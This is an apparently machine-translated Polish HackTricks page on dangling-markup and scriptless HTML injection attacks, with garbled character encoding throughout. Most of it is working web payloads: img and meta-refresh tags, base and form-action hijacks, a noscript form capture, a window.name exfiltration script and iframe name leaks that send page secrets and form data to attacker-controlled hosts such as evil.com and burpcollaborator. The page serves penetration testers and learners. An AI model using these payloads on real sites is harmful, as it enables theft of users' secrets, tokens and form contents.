# WiszÄ…cy znacznik - WstrzykniÄ™cie HTML bez skryptÃ³w

<details>

<summary><strong>Naucz siÄ™ hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na githubie.

</details>

## Podsumowanie

Ta technika moÅ¼e byÄ‡ uÅ¼yta do wydobycia informacji od uÅ¼ytkownika, gdy znajdzie siÄ™ **wstrzykniÄ™cie HTML**. Jest to bardzo przydatne, jeÅ›li **nie znajdziesz sposobu na wykorzystanie** [**XSS**](../xss-cross-site-scripting/), ale moÅ¼esz **wstrzyknÄ…Ä‡ pewne znaczniki HTML**.\
Jest to rÃ³wnieÅ¼ przydatne, jeÅ›li **jakiÅ› sekret jest zapisany w postaci zwykÅ‚ego tekstu** w HTML i chcesz go **wydobyÄ‡** z klienta, lub jeÅ›li chcesz wprowadziÄ‡ w bÅ‚Ä…d wykonanie pewnego skryptu.

Kilka omawianych tutaj technik moÅ¼e byÄ‡ uÅ¼ytych do obejÅ›cia niektÃ³rych [**Polityk BezpieczeÅ„stwa ZawartoÅ›ci**](../content-security-policy-csp-bypass/) poprzez wydobywanie informacji w nieoczekiwany sposÃ³b (znaczniki html, CSS, znaczniki http-meta, formularze, base...).

## GÅ‚Ã³wne Zastosowania

### KradzieÅ¼ tajemnic w postaci zwykÅ‚ego tekstu

JeÅ›li wstrzykniesz `<img src='http://evil.com/log.cgi?` gdy strona jest Å‚adowana, ofiara wyÅ›le Ci caÅ‚y kod miÄ™dzy wstrzykniÄ™tym tagiem `img` a nastÄ™pnym cudzysÅ‚owiem w kodzie. JeÅ›li jakiÅ› sekret znajduje siÄ™ w tym fragmencie, go ukradniesz (moÅ¼esz zrobiÄ‡ to samo uÅ¼ywajÄ…c podwÃ³jnego cudzysÅ‚owu, sprawdÅº, co moÅ¼e byÄ‡ bardziej interesujÄ…ce do uÅ¼ycia).

JeÅ›li tag `img` jest zabroniony (np. z powodu CSP), moÅ¼esz rÃ³wnieÅ¼ uÅ¼yÄ‡ `<meta http-equiv="refresh" content="4; URL='http://evil.com/log.cgi?`
```html
<img src='http://attacker.com/log.php?HTML=
<meta http-equiv="refresh" content='0; url=http://evil.com/log.php?text=
<meta http-equiv="refresh" content='0;URL=ftp://evil.com?a=
```
ZauwaÅ¼, Å¼e **Chrome blokuje adresy URL HTTP** zawierajÄ…ce "<" lub "\n", wiÄ™c moÅ¼na sprÃ³bowaÄ‡ innych schematÃ³w protokoÅ‚Ã³w, takich jak "ftp".

MoÅ¼na takÅ¼e naduÅ¼yÄ‡ CSS `@import` (wyÅ›le caÅ‚y kod do momentu znalezienia ";")
```html
<style>@import//hackvertor.co.uk?     <--- Injected
<b>steal me!</b>;
```
MoÅ¼esz rÃ³wnieÅ¼ uÅ¼yÄ‡ **`<table`**:
```html
<table background='//your-collaborator-id.burpcollaborator.net?'
```
MoÅ¼esz takÅ¼e wstawiÄ‡ tag `<base`. Wszystkie informacje zostanÄ… wysÅ‚ane do zamkniÄ™cia cytatu, ale wymaga to pewnej interakcji uÅ¼ytkownika (uÅ¼ytkownik musi kliknÄ…Ä‡ w jakiÅ› link, poniewaÅ¼ tag base zmieni domenÄ™ wskazywanÄ… przez link):
```html
<base target='        <--- Injected
steal me'<b>test</b>
```
### KradzieÅ¼ formularzy
```html
<base href='http://evil.com/'>
```
NastÄ™pnie formularze wysyÅ‚ajÄ…ce dane do Å›cieÅ¼ki (np. `<form action='update_profile.php'>`) bÄ™dÄ… wysyÅ‚aÄ‡ dane do zÅ‚oÅ›liwej domeny.

### KradzieÅ¼ formularzy 2

Ustaw nagÅ‚Ã³wek formularza: `<form action='http://evil.com/log_steal'>` to nadpisze nastÄ™pny nagÅ‚Ã³wek formularza i wszystkie dane z formularza zostanÄ… wysÅ‚ane do atakujÄ…cego.

### KradzieÅ¼ formularzy 3

Przycisk moÅ¼e zmieniÄ‡ adres URL, pod ktÃ³ry zostanÄ… wysÅ‚ane informacje z formularza, za pomocÄ… atrybutu "formaction":
```html
<button name=xss type=submit formaction='https://google.com'>I get consumed!
```
AtakujÄ…cy moÅ¼e uÅ¼yÄ‡ tego do kradzieÅ¼y informacji.

ZnajdÅº [**przykÅ‚ad tego ataku w tym opracowaniu**](https://portswigger.net/research/stealing-passwords-from-infosec-mastodon-without-bypassing-csp).

### KradzieÅ¼ tajemnic w czystym tekÅ›cie 2

KorzystajÄ…c z najnowszej wspomnianej techniki kradzieÅ¼y formularzy (wstrzykiwanie nowego nagÅ‚Ã³wka formularza), moÅ¼esz nastÄ™pnie wstrzyknÄ…Ä‡ nowe pole wprowadzania:
```html
<input type='hidden' name='review_body' value="
```
i to pole wejÅ›ciowe bÄ™dzie zawieraÄ‡ caÅ‚Ä… zawartoÅ›Ä‡ miÄ™dzy swoimi cudzysÅ‚owami i kolejnymi cudzysÅ‚owami w HTML. Ten atak Å‚Ä…czy "_**KradzieÅ¼ jawnych tajemnic**_" z "_**KradzieÅ¼Ä… formularzy2**_".

MoÅ¼esz zrobiÄ‡ to samo wstrzykujÄ…c formularz i znacznik `<option>`. Wszystkie dane do momentu znalezienia zamkniÄ™tego `</option>` zostanÄ… wysÅ‚ane:
```html
<form action=http://google.com><input type="submit">Click Me</input><select name=xss><option
```
### Wstrzykiwanie parametrÃ³w formularza

MoÅ¼esz zmieniÄ‡ Å›cieÅ¼kÄ™ formularza i wstawiÄ‡ nowe wartoÅ›ci, aby wykonaÄ‡ nieoczekiwane dziaÅ‚anie:
```html
<form action='/change_settings.php'>
<input type='hidden' name='invite_user'
value='fredmbogo'>                                        â† Injected lines

<form action="/change_settings.php">                        â† Existing form (ignored by the parser)
...
<input type="text" name="invite_user" value="">             â† Subverted field
...
<input type="hidden" name="xsrf_token" value="12345">
...
</form>
```
### KradzieÅ¼ tajemnic w czystym tekÅ›cie za pomocÄ… noscript

`<noscript></noscript>` Jest to tag, ktÃ³rego zawartoÅ›Ä‡ bÄ™dzie interpretowana, jeÅ›li przeglÄ…darka nie obsÅ‚uguje JavaScript (moÅ¼esz wÅ‚Ä…czyÄ‡/wyÅ‚Ä…czyÄ‡ JavaScript w Chrome w [chrome://settings/content/javascript](chrome://settings/content/javascript)).

Sposobem na wyciek zawartoÅ›ci strony internetowej od punktu wstrzykniÄ™cia do jej koÅ„ca na kontrolowanÄ… przez atakujÄ…cego stronÄ™ bÄ™dzie wstrzykniÄ™cie tego:
```html
<noscript><form action=http://evil.com><input type=submit style="position:absolute;left:0;top:0;width:100%;height:100%;" type=submit value=""><textarea name=contents></noscript>
```
### OminiÄ™cie CSP za pomocÄ… interakcji uÅ¼ytkownika

Z [badania portswiggers](https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup) moÅ¼na dowiedzieÄ‡ siÄ™, Å¼e nawet w **najbardziej ograniczonych CSP** Å›rodowiskach nadal moÅ¼na **wyciekaÄ‡ dane** za pomocÄ… **interakcji uÅ¼ytkownika**. W tym przypadku bÄ™dziemy uÅ¼ywaÄ‡ Å‚adunku:
```html
<a href=http://attacker.net/payload.html><font size=100 color=red>You must click me</font></a>
<base target='
```
ZauwaÅ¼, Å¼e poprosisz **ofiarÄ™**, aby **kliknÄ™Å‚a w link**, ktÃ³ry jÄ… **przekieruje** do **payloadu** kontrolowanego przez Ciebie. ZauwaÅ¼ rÃ³wnieÅ¼, Å¼e atrybut **`target`** wewnÄ…trz tagu **`base`** bÄ™dzie zawieraÅ‚ **treÅ›Ä‡ HTML** do nastÄ™pnego pojedynczego cudzysÅ‚owu. To sprawi, Å¼e **wartoÅ›Ä‡** **`window.name`** po klikniÄ™ciu w link bÄ™dzie caÅ‚Ä… tÄ… **treÅ›ciÄ… HTML**. Dlatego, kontrolujÄ…c stronÄ™, do ktÃ³rej ofiara uzyskuje dostÄ™p poprzez klikniÄ™cie w link, moÅ¼esz uzyskaÄ‡ dostÄ™p do **`window.name`** i **wyciec** te dane:
```html
<script>
if(window.name) {
new Image().src='//your-collaborator-id.burpcollaborator.net?'+encodeURIComponent(window.name);
</script>
```
### FaÅ‚szywy skrypt 1 - Atak na przestrzeÅ„ nazw HTML

Wstaw nowy tag z identyfikatorem wewnÄ…trz HTML, ktÃ³ry nadpisze nastÄ™pny i z wartoÅ›ciÄ…, ktÃ³ra wpÅ‚ynie na przebieg skryptu. W tym przykÅ‚adzie wybierasz, z kim informacja bÄ™dzie udostÄ™pniona:
```html
<input type='hidden' id='share_with' value='fredmbogo'>     â† Injected markup
...
Share this status update with:                              â† Legitimate optional element of a dialog
<input id='share_with' value=''>

...

function submit_status_update() {
...
request.share_with = document.getElementById('share_with').value;
...
}
```
### MylÄ…cy skrypt 2 - Atak na przestrzeÅ„ nazw skryptu

UtwÃ³rz zmienne w przestrzeni nazw JavaScript poprzez wstawienie tagÃ³w HTML. NastÄ™pnie ta zmienna wpÅ‚ynie na przebieg aplikacji:
```html
<img id='is_public'>                                        â† Injected markup

...

// Legitimate application code follows

function retrieve_acls() {
...
if (response.access_mode == AM_PUBLIC)                    â† The subsequent assignment fails in IE
is_public = true;
else
is_public = false;
}

function submit_new_acls() {
...
if (is_public) request.access_mode = AM_PUBLIC;           â† Condition always evaluates to true
...
}
```
### NaduÅ¼ycie JSONP

JeÅ›li znajdziesz interfejs JSONP, moÅ¼esz wywoÅ‚aÄ‡ dowolnÄ… funkcjÄ™ z dowolnymi danymi:
```html
<script src='/editor/sharing.js'>:              â† Legitimate script
function set_sharing(public) {
if (public) request.access_mode = AM_PUBLIC;
else request.access_mode = AM_PRIVATE;
...
}

<script src='/search?q=a&call=set_sharing'>:    â† Injected JSONP call
set_sharing({ ... })
```
MoÅ¼esz nawet sprÃ³bowaÄ‡ wykonaÄ‡ pewien kod JavaScript:
```html
<script src='/search?q=a&call=alert(1)'></script>
```
### NaduÅ¼ycie tagu Iframe

Dokument potomny ma zdolnoÅ›Ä‡ do przeglÄ…dania i modyfikowania wÅ‚aÅ›ciwoÅ›ci `location` swojego rodzica, nawet w sytuacjach miÄ™dzydomenowych. Pozwala to na osadzenie skryptu wewnÄ…trz tagu **iframe**, ktÃ³ry moÅ¼e przekierowaÄ‡ klienta na dowolnÄ… stronÄ™:
```html
<html><head></head><body><script>top.window.location = "https://attacker.com/hacked.html"</script></body></html>
```
To moÅ¼na zniwelowaÄ‡ uÅ¼ywajÄ…c czegoÅ› takiego jak: `sandbox=' allow-scripts allow-top-navigation'`

Iframe moÅ¼e rÃ³wnieÅ¼ zostaÄ‡ wykorzystany do wycieku poufnych informacji z innej strony **uÅ¼ywajÄ…c atrybutu nazwy iframe**. Dzieje siÄ™ tak, poniewaÅ¼ moÅ¼na stworzyÄ‡ iframe, ktÃ³ry zagnieÅ¼dÅ¼a sam w sobie, wykorzystujÄ…c wstrzykniÄ™cie HTML, ktÃ³re powoduje, Å¼e **poufne informacje pojawiajÄ… siÄ™ wewnÄ…trz atrybutu nazwy iframe**, a nastÄ™pnie uzyskaÄ‡ dostÄ™p do tej nazwy z poczÄ…tkowego iframe i wyciec te informacje.
```html
<script>
function cspBypass(win) {
win[0].location = 'about:blank';
setTimeout(()=>alert(win[0].name), 500);
}
</script>

<iframe src="//subdomain1.portswigger-labs.net/bypassing-csp-with-dangling-iframes/target.php?email=%22><iframe name=%27" onload="cspBypass(this.contentWindow)"></iframe>
```
For more info check [https://portswigger.net/research/bypassing-csp-with-dangling-iframes](https://portswigger.net/research/bypassing-csp-with-dangling-iframes)

### Wykorzystanie \<meta

MoÅ¼esz uÅ¼yÄ‡ **`meta http-equiv`** do wykonania **kilku dziaÅ‚aÅ„** takich jak ustawienie pliku Cookie: `<meta http-equiv="Set-Cookie" Content="SESSID=1">` lub przekierowanie (w tym przypadku za 5s): `<meta name="language" content="5;http://attacker.svg" HTTP-EQUIV="refresh" />`

MoÅ¼na to **uniknÄ…Ä‡** za pomocÄ… **CSP** dotyczÄ…cego **http-equiv** (`Content-Security-Policy: default-src 'self';`, lub `Content-Security-Policy: http-equiv 'self';`)

### Nowy tag HTML \<portal

MoÅ¼esz znaleÅºÄ‡ bardzo **interesujÄ…ce badania** na temat podatnoÅ›ci do wykorzystania tagu \<portal [tutaj](https://research.securitum.com/security-analysis-of-portal-element/).\
W chwili pisania tego tekstu musisz wÅ‚Ä…czyÄ‡ tag portal w Chrome w `chrome://flags/#enable-portals` lub nie bÄ™dzie dziaÅ‚aÄ‡.
```html
<portal src='https://attacker-server?
```
### Wycieki HTML

Nie wszystkie sposoby wycieku Å‚Ä…cznoÅ›ci w HTML bÄ™dÄ… przydatne dla Dangling Markup, ale czasami mogÄ… pomÃ³c. SprawdÅº je tutaj: [https://github.com/cure53/HTTPLeaks/blob/master/leak.html](https://github.com/cure53/HTTPLeaks/blob/master/leak.html)

## Wycieki SS

Jest to **miks** pomiÄ™dzy **dangling markup i XS-Leaks**. Z jednej strony podatnoÅ›Ä‡ pozwala na **wstrzykniÄ™cie HTML** (ale nie JS) na stronie **tej samej domeny**, ktÃ³rÄ… bÄ™dziemy atakowaÄ‡. Z drugiej strony nie bÄ™dziemy **atakowaÄ‡** bezpoÅ›rednio strony, na ktÃ³rej moÅ¼emy wstrzyknÄ…Ä‡ HTML, ale **innej strony**.

{% content-ref url="ss-leaks.md" %}
[ss-leaks.md](ss-leaks.md)
{% endcontent-ref %}

## XS-Search/XS-Leaks

XS-Search sÄ… skierowane na **wyciek informacji miÄ™dzy domenami** poprzez naduÅ¼ycie **atakÃ³w kanaÅ‚Ã³w bocznych**. Dlatego jest to inna technika niÅ¼ Dangling Markup, jednakÅ¼e niektÃ³re z technik naduÅ¼ywajÄ… wÅ‚Ä…czenia tagÃ³w HTML (z i bez wykonania JS), jak [**Wstrzykiwanie CSS**](../xs-search.md#css-injection) lub [**OpÃ³Åºnione Åadowanie ObrazÃ³w**](../xs-search.md#image-lazy-loading)**.**

{% content-ref url="../xs-search.md" %}
[xs-search.md](../xs-search.md)
{% endcontent-ref %}

## Lista Wykrywania AtakÃ³w Brute-Force

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/dangling_markup.txt" %}

## Referencje

* [https://aswingovind.medium.com/content-spoofing-yes-html-injection-39611d9a4057](https://aswingovind.medium.com/content-spoofing-yes-html-injection-39611d9a4057)
* [http://lcamtuf.coredump.cx/postxss/](http://lcamtuf.coredump.cx/postxss/)
* [http://www.thespanner.co.uk/2011/12/21/html-scriptless-attacks/](http://www.thespanner.co.uk/2011/12/21/html-scriptless-attacks/)
* [https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup](https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup)

<details>

<summary><strong>Naucz siÄ™ hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF** sprawdÅº [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakowania, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
